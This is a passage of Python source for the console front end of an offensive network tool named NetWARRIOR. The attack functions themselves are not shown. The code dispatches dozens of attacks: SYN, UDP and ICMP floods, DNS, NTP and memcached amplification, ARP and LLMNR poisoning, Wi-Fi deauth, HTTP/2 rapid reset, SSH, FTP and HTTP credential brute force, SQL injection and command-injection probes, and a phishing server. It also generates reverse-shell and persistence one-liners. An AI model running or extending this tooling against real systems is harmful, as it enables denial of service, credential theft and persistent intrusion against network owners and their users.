            ("zone <domain> <server>",             "DNS zone transfer attempt"),
            ("vuln <ip>",                          "Vulnerability check against banners"),
            ("sshbrute / ftpbrute / httpbasic",    "Credential brute force attacks"),
            ("sql / xss / lfi / ssrf / cmdinj",    "Web application vulnerability probes"),
            ("attack <type> <target> [port] [dur] [pps]", "Launch an attack (see ATTACK menu)"),
            ("list",                               "List active attacks"),
            ("stop  /  s",                         "Stop all running attacks (engine keeps running)"),
            ("status",                             "Packet count, traffic and active attack count"),
            ("report  /  report save",             "Report view  /  export an HTML report"),
            ("payload revshell <host> <port>",     "Generate a reverse-shell one-liner"),
            ("payload persist <cron|systemd> <cmd>","Generate a persistence one-liner"),
            ("conns",                              "Show live connection table"),
            ("q  /  quit",                         "Exit NetWARRIOR cleanly"),
        ]
        for cmd, desc in cmds:
            t.add_row(cmd, desc)

        hint = Text(
            "\n  Type commands here. Press Enter to execute.\n",
            style=self._c("dim"),
        )
        return Panel(
            Group(t, hint),
            title=f"[bold {self._c('command')}]COMMAND REFERENCE[/]",
            border_style=self._c("command"),
            box=pb,
            padding=(0, 1),
        )

    # ── Log panel ─────────────────────────────────────────────────────────────
    def _render_logs(self, cols: int) -> Panel:
        pb = self._panel_box()

        level_map = {
            "ok":    ("OK  ", self._c("log_ok")),
            "error": ("ERR ", self._c("log_err")),
            "warn":  ("WARN", self._c("log_warn")),
            "info":  ("INFO", self._c("log_info")),
        }

        entries = self.log.get(12)
        lines = Text()
        for entry in entries:
            level  = entry.get("level", "info")
            label, lstyle = level_map.get(level, ("INFO", self._c("log_info")))
            tag    = entry.get("tag", "")
            msg    = entry.get("msg", "")

            # Truncate message to fit terminal width
            tag_w  = 10
            meta_w = 2 + 8 + 2 + 4 + 2 + tag_w + 2   # indent+time+gap+level+gap+tag+gap
            max_msg= max(20, cols - meta_w)
            if len(msg) > max_msg:
                msg = msg[:max_msg - 1] + "…"

            lines.append(f"  {entry['time']}  ", style=self._c("log_time"))
            lines.append(f"{label}  ",            style=f"bold {lstyle}")
            if tag:
                lines.append(f"{tag:<10}", style=self._c("log_tag"))
                lines.append("  ")
            lines.append(msg + "\n", style=self._c("log_msg"))

        if not entries:
            lines.append("  No log entries yet.", style=self._c("dim"))

        return Panel(
            lines,
            title=f"[{self._c('border')}]LOGS[/]",
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Output panel ──────────────────────────────────────────────────────────
    def _render_output(self, cols: int) -> Panel:
        pb = self._panel_box()

        if self.cmd_output:
            body = Text(self.cmd_output, style=self._c("output"))
        else:
            body = Text(
                "  No output yet.",
                style=self._c("output_dim"),
            )

        prompt = Text()
        prompt.append("\n  >> ", style=self._c("prompt"))
        prompt.append("Type a command and press Enter", style=self._c("dim"))

        return Panel(
            Group(body, prompt),
            title=f"[{self._c('border')}]OUTPUT[/]",
            border_style=self._c("border_dim"),
            box=pb,
            padding=(0, 1),
        )

    # ── Command processor ─────────────────────────────────────────────────────
    async def _process_command(self, cmd):
        parts = cmd.strip().split()
        if not parts:
            return
        command = parts[0].lower()
        args = parts[1:]

        if command in ("q", "quit"):
            self.running = False
            return
        elif command == "1":
            self.mode = "attack"
            self.cmd_output = "Switched to Attack Menu"
            return
        elif command == "2":
            self.mode = "recon"
            self.cmd_output = "Switched to Recon Menu"
            return
        elif command == "3":
            self.mode = "pentest"
            self.cmd_output = "Switched to Pentest Menu"
            return
        elif command == "4":
            self.mode = "report"
            self.cmd_output = "Switched to Report"
            return
        elif command == "5":
            self.mode = "command"
            self.cmd_output = "Command mode active. Type commands directly."
            return
        elif command in ("s", "stop"):
            n = len(self.registry.active())
            self._stop_attacks()
            self.cmd_output = f"Stopped {n} running attack(s)." if n else "No attacks running."
            return

        def table_to_str(table):
            cap = StringIO()
            cap_con = Console(file=cap, highlight=False)
            cap_con.print(table)
            return cap.getvalue()

        output = ""
        try:
            if command == "help":
                self.mode = "command"
                output = "Command reference displayed above."
            elif command == "scan":
                if len(args) < 1:
                    output = "[red]Usage: scan <ip> or <subnet>[/]"
                else:
                    target = args[0]
                    if "/" in target:
                        devices = await self.recon.network_map(target)
                        table = Table(title=f"Devices in {target}")
                        table.add_column("IP")
                        table.add_column("MAC")
                        table.add_column("Hostname")
                        for ip, d in devices.items():
                            table.add_row(ip, d.get("mac", "N/A"), d.get("hostname", "N/A"))
                        output = table_to_str(table)
                    else:
                        ports = await self.recon.port_scan(
                            target,
                            [21, 22, 23, 25, 53, 80, 110, 443, 445, 3306, 3389, 5900, 6379, 8080, 8443]
                        )
                        output = f"[green]Open ports on {target}: {ports}[/]"
            elif command == "fingerprint":
                if len(args) < 1:
                    output = "[red]Usage: fingerprint <ip>[/]"
                else:
                    fp = await self.recon.fingerprint(args[0])
                    table = Table(title=f"Fingerprint {args[0]}")
                    table.add_column("Property")
                    table.add_column("Value")
                    table.add_row("OS",         fp.get("os", "Unknown"))
                    table.add_row("TTL",        str(fp.get("ttl", "N/A")))
                    table.add_row("Open Ports", ", ".join(map(str, fp.get("ports", []))))
                    output = table_to_str(table)
            elif command == "map":
                subnet = args[0] if args else "192.168.1.0/24"
                devices = await self.recon.network_map(subnet)
                output = f"[green]Found {len(devices)} devices[/]"
            elif command == "dns":
                if len(args) < 1:
                    output = "[red]Usage: dns <domain>[/]"
                else:
                    ans = self.recon.dns_lookup(args[0])
                    output = str(ans)
            elif command == "dnsrev":
                if len(args) < 1:
                    output = "[red]Usage: dnsrev <ip>[/]"
                else:
                    ans = self.recon.dns_reverse(args[0])
                    output = str(ans)
            elif command == "zone":
                if len(args) < 2:
                    output = "[red]Usage: zone <domain> <server>[/]"
                else:
                    ans = self.recon.zone_transfer(args[0], args[1])
                    output = str(ans)
            elif command == "vuln":
                if len(args) < 1:
                    output = "[red]Usage: vuln <ip>[/]"
                else:
                    results = await self.recon.vuln_scan(args[0])
                    if results:
                        table = Table(title=f"Vulnerabilities on {args[0]}")
                        table.add_column("Port")
                        table.add_column("Vulnerability")
                        table.add_column("Severity")
                        for v in results:
                            table.add_row(str(v["port"]), v["vulnerability"], v["severity"])
                        output = table_to_str(table)
                    else:
                        output = "[green]No common vulnerabilities found[/]"
            elif command == "sshbrute":
                if len(args) < 3:
                    output = "[red]Usage: sshbrute <host> <user> <wordlist>[/]"
                else:
                    found = await self.pentest.ssh_brute(args[0], args[1], args[2])
                    output = (
                        f"[red]Password found: {found}[/]"
                        if found
                        else "[yellow]No password found[/]"
                    )
            elif command == "ftpbrute":
                if len(args) < 3:
                    output = "[red]Usage: ftpbrute <host> <user> <wordlist>[/]"
                else:
                    att = await self.attacks.ftp_brute(args[0], args[1], args[2])
                    output = (
                        f"[red]Password found: {att.findings[0]['password']}[/]"
                        if att.findings
                        else "[yellow]No password found[/]"
                    )
            elif command == "httpbasic":
                if len(args) < 3:
                    output = "[red]Usage: httpbasic <url> <userwordlist> <passwordlist>[/]"
                else:
                    att = await self.attacks.http_basic_brute(args[0], args[1], args[2])
                    if att.findings:
                        creds = att.findings[0]["credentials"]
                        output = f"[red]Credentials found: {creds[0]}:{creds[1]}[/]"
                    else:
                        output = "[yellow]No credentials found[/]"
            elif command == "conns":
                att = await self.attacks.connection_table()
                output = (
                    att.findings[0]["table"]
                    if att.findings
                    else "[yellow]No connections found[/]"
                )
            elif command == "sql":
                if len(args) < 2:
                    output = "[red]Usage: sql <url> <param>[/]"
                else:
                    results = await self.pentest.web_sql_injection(args[0], [args[1]])
                    output = str(results)
            elif command == "xss":
                if len(args) < 2:
                    output = "[red]Usage: xss <url> <param>[/]"
                else:
                    results = await self.pentest.web_xss_scan(args[0], [args[1]])
                    output = str(results)
            elif command == "lfi":
                if len(args) < 2:
                    output = "[red]Usage: lfi <url> <param>[/]"
                else:
                    results = await self.pentest.web_lfi_scan(args[0], [args[1]])
                    output = str(results)
            elif command == "ssrf":
                if len(args) < 2:
                    output = "[red]Usage: ssrf <url> <param>[/]"
                else:
                    att = await self.attacks.ssrf_scan(args[0], [args[1]])
                    output = (
                        f"SSRF findings: {att.findings[0]['vulnerabilities']}"
                        if att.findings
                        else "[green]No SSRF vulnerabilities found[/]"
                    )
            elif command == "cmdinj":
                if len(args) < 2:
                    output = "[red]Usage: cmdinj <url> <param>[/]"
                else:
                    att = await self.attacks.cmd_injection_scan(args[0], [args[1]])
                    output = (
                        f"Command injection: {att.findings[0]['vulnerabilities']}"
                        if att.findings
                        else "[green]No command injection found[/]"
                    )
            elif command == "attack":
                if len(args) < 1:
                    output = "[red]Usage: attack <type> <target> [port] [duration] [pps][/]"
                else:
                    def _int(v, d):
                        try:
                            return int(v)
                        except (TypeError, ValueError):
                            return d
                    atype    = args[0].lower()
                    target   = args[1] if len(args) > 1 else ""
                    port     = _int(args[2], 80)   if len(args) > 2 else 80
                    duration = _int(args[3], 30)   if len(args) > 3 else 30
                    pps      = self.config.clamp_pps(_int(args[4], 1000) if len(args) > 4 else 1000)
                    try:
                        coro, needs_target = self._build_attack(atype, target, port, duration, pps)
                    except ValueError as e:
                        output = f"[red]{e}[/]"
                    except KeyError:
                        output = f"[red]Unknown attack type: {atype}  —  see the ATTACK menu[/]"
                    else:
                        reason = self.config.check_target(target) if needs_target else None
                        if needs_target and not target:
                            coro.close()
                            output = f"[red]Attack '{atype}' requires a target[/]"
                        elif reason:
                            coro.close()
                            output = f"[red]{reason}[/]"
                        else:
                            self._spawn_attack(coro)
                            tgt = f" on {target}" if target else ""
                            output = (f"[green]Attack '{atype}' launched{tgt} "
                                      f"(duration {duration}s, {pps} pps). Type 'stop' to end it.[/]")
            elif command == "list":
                active = self.registry.active()
                output = (
                    f"[yellow]Active ({len(active)}): {', '.join(active)}[/]"
                    if active
                    else "[dim]No active attacks[/]"
                )
            elif command in ("stop", "s"):
                n = len(self.registry.active())
                self._stop_attacks()
                output = f"[red]Stopped {n} running attack(s)[/]" if n else "[dim]No attacks running[/]"
            elif command == "status":
                pkts   = self.registry.total_packets()
                active = self.registry.active()
                output = (
                    f"Packets: {pkts:,}   "
                    f"Traffic: {Utils.human_size(self.registry.total_bytes())}   "
                    f"Active: {len(active)}   "
                    f"IP: {self.net.ip or 'N/A'}"
                )
            elif command in ("report", "savereport"):
                if command == "savereport" or (args and args[0] == "save"):
                    path = Report.save(self.config, self.registry, self.log, self.net)
                    output = f"[green]Report written to {path}[/]" if path else "[red]Report failed[/]"
                else:
                    self.mode = "report"
                    output = "Switched to Report view  (use 'report save' to write HTML)"
            elif command == "menu":
                self.mode = "menu"
                output = "Back to main menu"
            elif command == "payload":
                output = self._payload_command(args)
            else:
                output = f"[red]Unknown command: {command}  —  type 'help' for reference[/]"
        except Exception as e:
            output = f"[red]Error: {e}[/]"

        self.cmd_output = output

    # ── Attack coroutine builder ──────────────────────────────────────────────
    def _build_attack(self, atype, target, port, duration, pps):
        """
        Return ``(coroutine, needs_target)`` for an ``attack`` command.

        Raises ``KeyError`` for an unknown type and ``ValueError`` for a type
        that has its own dedicated command instead.
        """
        redirect = {
            "sshbrute":   "sshbrute <host> <user> <wordlist>",
            "ftpbrute":   "ftpbrute <host> <user> <wordlist>",
            "httpbasic":  "httpbasic <url> <userlist> <passlist>",
            "ssrf":       "ssrf <url> <param>",
            "cmdinj":     "cmdinj <url> <param>",
            "sql":        "sql <url> <param>",
            "xss":        "xss <url> <param>",
            "lfi":        "lfi <url> <param>",
        }
        if atype in redirect:
            raise ValueError(f"'{atype}' has its own command:  {redirect[atype]}")

        a = self.attacks
        iface = self.config.interface
        DP = dict(duration=duration, pps=pps)
        D  = dict(duration=duration)
        specs = {
            # target + port + duration + pps
            "syn":  (lambda: a.syn_flood(target, port, duration, pps), True),
            "udp":  (lambda: a.udp_flood(target, port, duration, pps), True),
            "ack":  (lambda: a.tcp_ack_flood(target, port, duration, pps), True),
            "rst":  (lambda: a.tcp_rst_flood(target, port, duration, pps), True),
            "xmas": (lambda: a.tcp_xmas_flood(target, port, duration, pps), True),
            "null": (lambda: a.tcp_null_flood(target, port, duration, pps), True),
            "fin":  (lambda: a.tcp_fin_flood(target, port, duration, pps), True),
            "zero": (lambda: a.tcp_zero_window(target, port, duration, pps), True),
            "land": (lambda: a.land(target, port, duration, pps), True),
            "sctp": (lambda: a.sctp_init_flood(target, port, duration, pps), True),
            # target + duration (+ pps)
            "icmp":      (lambda: a.icmp_flood(target, **DP), True),
            "smurf":     (lambda: a.smurf(target, **DP), True),
            "mac":       (lambda: a.mac_flood(target, **DP), True),
            "teardrop":  (lambda: a.teardrop(target, **DP), True),
            "pod":       (lambda: a.ping_of_death(target, **DP), True),
            "gre":       (lambda: a.gre_ip_spoof(target, **DP), True),
            "vlan":      (lambda: a.vlan_double_tag(target, **DP), True),
            "arp":       (lambda: a.arp_poison(target, **D), True),
            "dnsamp":    (lambda: a.dns_amp(target, **DP), True),
            "ntpamp":    (lambda: a.ntp_amp(target, **DP), True),
            "snmpamp":   (lambda: a.snmp_amp(target, **DP), True),
            "memcached": (lambda: a.memcached_amp(target, **DP), True),
            "ssdpamp":   (lambda: a.ssdp_amp(target, **DP), True),
            "chargen":   (lambda: a.chargen_amp(target, **DP), True),
            "ipv6ra":    (lambda: a.ipv6_ra_flood(target, **DP), True),
            "ipv6na":    (lambda: a.ipv6_na_flood(target, **DP), True),
            "ipv6ns":    (lambda: a.ipv6_ns_flood(target, **DP), True),
            "llmnr":     (lambda: a.llmnr_poison(target, **D), True),
            "nbns":      (lambda: a.nbns_poison(target, **D), True),
            "mdns":      (lambda: a.mdns_poison(target, **D), True),
            "dhcp":      (lambda: a.dhcp_starvation(**D), False),
            "deauth":    (lambda: a.deauth(target, iface=(iface or "wlan0mon"), **D), True),
            # app layer: target + port + duration
            "slowloris":  (lambda: a.slowloris(target, port=port, duration=duration), True),
            "http":       (lambda: a.http_flood(target, port=port, duration=duration), True),
            "rudy":       (lambda: a.rudy_attack(target, port=port, duration=duration), True),
            "slowread":   (lambda: a.slow_read(target, port=port, duration=duration), True),
            "http2reset": (lambda: a.http2_rapid_reset(target, port=port, duration=duration), True),
            "ws":         (lambda: a.websocket_flood(target, port=port, duration=duration), True),
            "perf":       (lambda: a.network_perf(target, port=port, duration=duration), True),
            "pcap":       (lambda: a.replay_pcap(target, duration=duration, pps=pps), True),
            "nmap":       (lambda: a.nmap_wrapper(target, duration=max(duration, 60)), True),
            "sqlmap":     (lambda: a.sqlmap_wrapper(target, duration=max(duration, 60)), True),
            "autoesc":    (lambda: a.auto_escalate(target), True),
            "chaos":      (lambda: a.chaos_mode(target, duration=duration), True),
            # no target required
            "beacon":        (lambda: a.beacon_flood(iface=(iface or "wlan0mon"), duration=duration), False),
            "ssdpdiscovery": (lambda: a.ssdp_discovery(duration=duration), False),
            "radiuspod":     (lambda: a.radius_pod(duration=duration), False),
            "bandwidth":     (lambda: a.bandwidth_meter(duration=duration), False),
            "conns":         (lambda: a.connection_table(), False),
            "cloud":         (lambda: a.cloud_recon(target_ips=[target] if target else None, duration=duration), False),
            "phish":         (lambda: a.start_phishing_server(port=port, duration=duration), False),
            "l2cdp":         (lambda: a.l2_protocol_flood("cdp", **DP), False),
            "l2lldp":        (lambda: a.l2_protocol_flood("lldp", **DP), False),
            "l2stp":         (lambda: a.l2_protocol_flood("stp", **DP), False),
            # interface-scoped (an optional interface name may be given as target)
            "passive":  (lambda: a.passive_capture(interface=(target or iface), duration=duration), False),
            "traffic":  (lambda: a.traffic_monitor(interface=(target or iface), duration=duration), False),
            "wirehand": (lambda: a.wireless_handshake_capture(iface=(target or iface or "wlan0mon"), duration=duration), False),
        }
        maker, needs_target = specs[atype]        # KeyError -> unknown type
        return maker(), needs_target

    def _payload_command(self, args) -> str:
        if not args:
            return ("[red]Usage: payload revshell <host> <port> [bash|python|nc]  |  "
                    "payload persist <cron|systemd> <command>[/]")
        kind = args[0].lower()
        if kind in ("revshell", "reverse", "rev"):
            if len(args) < 3:
                return "[red]Usage: payload revshell <host> <port> [bash|python|nc][/]"
            shell = args[3] if len(args) > 3 else "bash"
            return PostExploit.reverse_shell_payload(args[1], args[2], shell) or "[red]Unknown shell type[/]"
        if kind in ("persist", "persistence"):
            if len(args) < 3:
                return "[red]Usage: payload persist <cron|systemd> <command...>[/]"
            return PostExploit.persistence_payload(args[1], " ".join(args[2:])) or "[red]Unknown method[/]"
        return f"[red]Unknown payload kind: {kind}[/]"
# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────
async def main():
    config = Config()
    net = NetworkContext()
    registry = AttackRegistry()
    log = LogBus()
    engine = AttackEngine(config, registry, log, net)
    ui = UI(config, net, registry, log, engine)
    try:
        await ui.run()
    except (KeyboardInterrupt, asyncio.CancelledError):
        console.print("\n[yellow]Interrupted[/]")
        await ui._shutdown()
    finally:
        console.print("[green]Goodbye.[/]")


if __name__ == "__main__":
    if _UVLOOP:
        uvloop.install()
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass